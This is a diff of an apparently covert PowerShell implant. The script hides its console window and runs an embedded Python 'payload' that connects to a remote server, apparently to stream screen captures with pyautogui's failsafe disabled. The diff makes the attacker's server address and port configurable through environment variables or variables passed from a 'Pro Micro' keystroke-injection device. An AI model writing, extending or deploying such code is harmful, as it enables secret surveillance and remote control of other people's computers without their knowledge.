@@ -16,6 +16,14 @@ try {
     [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
 } catch {}
 
+# Get server IP and port from environment or use defaults
+$serverIP = if ($env:RCPY_SERVER) { $env:RCPY_SERVER } else { "172.28.1.78" }
+$serverPort = if ($env:RCPY_PORT) { $env:RCPY_PORT } else { 5555 }
+
+# If passed as variables from Pro Micro
+if ($c) { $serverIP = $c }
+if ($p) { $serverPort = $p }
+
 # Python payload - screen capture version
 $pythonCode = @"
 import socket,pickle,pyautogui,cv2,numpy as np,time,sys,threading
@@ -28,7 +36,7 @@ pyautogui.FAILSAFE=False
 s=socket.socket()
 s.settimeout(10)
 try:
-    s.connect(('172.28.1.78',5555))
+    s.connect(('$serverIP',$serverPort))
 except:
     sys.exit()
 s.settimeout(0.1)
